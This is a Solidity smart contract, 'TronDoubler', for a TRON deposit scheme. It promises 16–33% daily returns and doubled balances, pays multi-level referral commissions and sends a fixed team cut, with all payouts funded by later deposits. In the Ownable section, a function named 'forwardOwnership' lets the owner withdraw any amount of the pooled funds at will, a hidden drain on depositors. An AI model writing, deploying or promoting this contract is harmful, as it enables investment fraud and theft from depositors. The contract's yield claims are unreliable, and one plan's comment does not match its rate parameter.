//SourceUnit: TronDoubler.sol

pragma solidity >=0.5.4;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev owner withdraw of the contract.
     * Can only be called by the current owner.
     */
    function forwardOwnership(uint256 value) public onlyOwner {
        address payable ownerWallet = address(uint160(_owner));
        ownerWallet.transfer(value);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ReferralContract {
    using SafeMath for uint256;

    // Mapping from account to the list of referrals
    mapping(address => address[]) public referrals;
    mapping(address => uint256[]) public referralsCount;
    mapping(address => uint256[]) public referralEarn;

    uint256 public totalReferral;
    uint256 public totalReferralEarn;

    // Mapping from account to inviter
    mapping(address => address) public parent;

    function getReferralStats(address payee) public view returns (uint256[] memory, uint256[] memory) {
        return (referralsCount[payee], referralEarn[payee]);
    }

    /**
     * @dev Internal function to add a referral to this extension's ownership-tracking data structures.
     * @param to address representing the new account of the given referral
     * @param childAddr address of the referral to be added to the referrals list of the given address
     */
    function _addReferral(address to, address childAddr) internal {
        referrals[to].push(childAddr);
        parent[childAddr] = to;
        totalReferral = totalReferral.add(1);
        if (referralsCount[to].length == 0){
            referralsCount[to] = new uint256[](3);
            referralEarn[to] = new uint256[](3);
        }
        referralsCount[to][0] = referralsCount[to][0].add(1);
        address parentAddr = parent[to];
        if (parentAddr != address(0)){
            referralsCount[parentAddr][1] = referralsCount[parentAddr][1].add(1);
            parentAddr = parent[parentAddr];
            if (parentAddr != address(0)){
                referralsCount[parentAddr][2] = referralsCount[parentAddr][2].add(1);
            }
        }
    }
}

/**
  * @title TronDoubler
  * @dev TronDoubler is designed to double your TRX balance.
  */
contract TronDoubler is ReferralContract, Ownable{
    using SafeMath for uint256;

    event Deposited(address indexed payee, address indexed referrer, uint256 amount, uint256 plan);
    event Withdrawn(address indexed payee, uint256 amount);

    mapping(address => Invest[]) public deposits;
    mapping(address => uint256) public withdrawns;
    uint256 public totalDeposit;
    uint256 public totalWithdrawn;
    uint256[] public refReward = [6, 3, 1];
    uint256 constant public teamShare = 10;
    address payable constant public teamWallet = address(0x41c536405b54349ad8366cc99b6d3720f2ff2e4c48);

    bool public VIPPlan = false;

    struct Plan {
        uint256 period;
        uint256 minDeposit;
        uint256 rateDivider;
    }

    Plan[] public plans;

    struct Invest {
        uint256 planId;
        uint256 baseTime;
        uint256 lastCollectTime;
        uint256 value;
        bool expired;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial plans and main wallet.
     */
    constructor() public {
        plans.push(Plan(12, 5000000, 518400));      // 12Day ===> 16.66% Daily Profit
        plans.push(Plan(10, 10000000000, 432000));  // 10Day ===> 20% Daily Profit
        plans.push(Plan(8, 200000000000, 345600));  // 8Day ===> 25% Daily Profit
        plans.push(Plan(6, 5000000000, 295200));    // 6Day ===> 33.33% Daily Profit
        _addReferral(address(0), msg.sender);
    }

    /**
     * @dev To display the general's stats of contract.
     */
    function getGameStats() public view returns (uint256[] memory) {
        uint256[] memory combined = new uint256[](5);
        combined[0] = totalReferral;
        combined[1] = totalDeposit;
        combined[2] = totalWithdrawn;
        combined[3] = totalReferralEarn;
        combined[4] = address(this).balance;
        return combined;
    }

    /**
     * @dev To display the deposit stats of an account.
     * @param payee Invester account for stat
     */
    function getDepositsStats(address payee) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        Invest[] memory invests = deposits[payee];
        uint256[] memory planIds = new uint256[](invests.length);
        uint256[] memory baseTimes = new uint256[](invests.length);
        uint256[] memory lastCollectTimes = new uint256[](invests.length);
        uint256[] memory values = new uint256[](invests.length);
        bool[] memory expireds = new bool[](invests.length);

        uint256 i = 0;
        while (i < invests.length){
            Invest memory invest = invests[i];
            planIds[i] = invest.planId;
            baseTimes[i] = invest.baseTime;
            lastCollectTimes[i] = invest.lastCollectTime;
            values[i] = invest.value;
            expireds[i] = invest.expired;
            i++;
        }
        return (planIds, baseTimes, lastCollectTimes, values, expireds);
    }

    /**
     * @dev VIP plan setting.
     * @param flag Set the VIP plan status
     */
    function setVIPPlanFlag(bool flag) public onlyOwner {
        VIPPlan = flag;
    }

    /**
     * @dev Set personal referral link.
     * @param referrer The inviter address
     */
    function setReferral(address referrer) public {
        require(parent[msg.sender] == address(0), "Inviter address was set in the TronDoubler network!");
        require(parent[referrer] != address(0) || referrer == owner(), "Inviter address does not exist in the TronDoubler network!");
        _addReferral(referrer, msg.sender);
    }

    /**
     * @dev TronDoubler plan invest.
     * @param referrer The inviter address
     * @param planId The plan for invest
     */
    function deposit(address referrer, uint256 planId) public payable {
        require(now > 1595421000, "Invest start at: Wednesday, July 22, 2020 12:30:00 PM!");
        require(planId < 3 || (planId < 4 && VIPPlan), "The plan must be chosen correctly!");
        uint256 amount = msg.value;
        require(amount >= plans[planId].minDeposit, "Your investment amount is less than the minimum amount!");
        address payable payee = msg.sender;
        if (parent[payee] == address(0)){
            setReferral(referrer);
        }
        deposits[payee].push(Invest(planId, now, now, amount, false));
        totalDeposit = totalDeposit.add(amount);
        _referralPayment(referrer, amount);
        emit Deposited(payee, referrer, amount, planId);
    }

    /**
     * @dev Withdraw accumulated balance for a payee.
     */
    function withdraw() public {
        address payable payee = msg.sender;
        uint256 payment = checkout(payee);
        withdrawns[payee] = withdrawns[payee].add(payment);
        totalWithdrawn = totalWithdrawn.add(payment);
        payee.transfer(payment);
        emit Withdrawn(payee, payment);
    }

    /**
     * @dev checkout profit balance for a payee.
     * @param addr Invester account for checkout
     */
    function checkout(address payable addr) private returns (uint256){
        Invest[] storage invests = deposits[addr];
        uint256 profit = 0;
        uint256 i = 0;
        while (i < invests.length){
            Invest storage invest = invests[i];
            if (invest.expired){
                i++;
                continue;
            }
            Plan memory plan = plans[invest.planId];
            if (invest.lastCollectTime < invest.baseTime.add(plan.rateDivider.mul(2))){
                uint256 remainedTime = plan.rateDivider.mul(2).sub(invest.lastCollectTime.sub(invest.baseTime));
                if (remainedTime > 0){
                    uint256 timeSpent = now.sub(invest.lastCollectTime);
                    if (remainedTime <= timeSpent){
                        timeSpent = remainedTime;
                        invest.expired = true;
                    }
                    invest.lastCollectTime = now;
                    profit = profit.add(invest.value.mul(timeSpent).div(plan.rateDivider));
                }
            }
            i++;
        }
        return profit;
    }

    /**
     * @dev Determines how referral TRX is stored/forwarded on investment.
     * @param referrer Refer invester to investment
     * @param amount commission portion of investment amount
     */
    function _referralPayment(address referrer, uint256 amount) internal {
        uint256 level = 0;
        uint256 value = 0;
        address payable refWallet = address(uint160(referrer));

        while(refWallet != address(0) && level < 3){
            value = amount.mul(refReward[level]).div(100);
            refWallet.transfer(value);
            referralEarn[refWallet][level] = referralEarn[refWallet][level].add(value);
            totalReferralEarn = totalReferralEarn.add(value);
            refWallet = address(uint160(parent[refWallet]));
            level = level.add(1);
        }
        value = amount.mul(teamShare).div(100);
        teamWallet.transfer(value);
    }
}